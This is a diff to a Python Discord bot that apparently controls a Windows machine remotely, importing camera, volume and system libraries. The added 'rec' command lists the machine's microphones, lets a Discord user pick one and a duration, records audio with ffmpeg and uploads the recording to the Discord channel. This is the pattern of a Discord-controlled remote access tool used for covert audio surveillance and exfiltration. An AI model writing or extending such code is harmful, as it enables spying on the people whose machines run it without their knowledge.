@@ -17,6 +17,7 @@ import cv2
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import ctypes
+import subprocess
 
 load_dotenv()
 
@@ -50,12 +51,35 @@ class MyClient(discord.Client):
         print(f'Logged on as {self.user}!') ,
     async def on_message(self, message):
         try:
+            # Ask Discord user which mic to use and send a mic list then record a 30 second audio clip through specified mic and send it into the Discord
             if f'{message.content}' == 'rec':
-                await message.channel.send('Recording...')
-                os.system('ffmpeg -f dshow -i audio="Microphone Array (Realtek(R) Audio)" -t 30 output.wav')
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel
+
+                # List available devices
+                result = subprocess.run(['ffmpeg', '-list_devices', 'true', '-f', 'dshow', '-i', 'dummy'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                
+                # Write the device list to a file
+                with open('devices.txt', 'w') as f:
+                    f.write(result.stderr)
+                
+                # Send the device list file to Discord
+                await message.channel.send(file=discord.File('devices.txt'))
+                os.remove('devices.txt')
+
+                await message.channel.send('Please enter the name of the mic you would like to use')
+                msg = await client.wait_for('message', check=check)
+                mic = msg.content
+
+                await message.channel.send('How long would you like to record?')
+                msg = await client.wait_for('message', check=check)
+                time = msg.content
+
+                # Record audio from the specified device
+                subprocess.run(['ffmpeg', '-f', 'dshow', '-i', f'audio={mic}', '-t', f'{time}', 'output.wav'])
                 await message.channel.send(file=discord.File('output.wav'))
                 os.remove('output.wav')
-
+            
             if f'{message.content}' == 'upd':
 
                 await message.channel.send('Updating...')
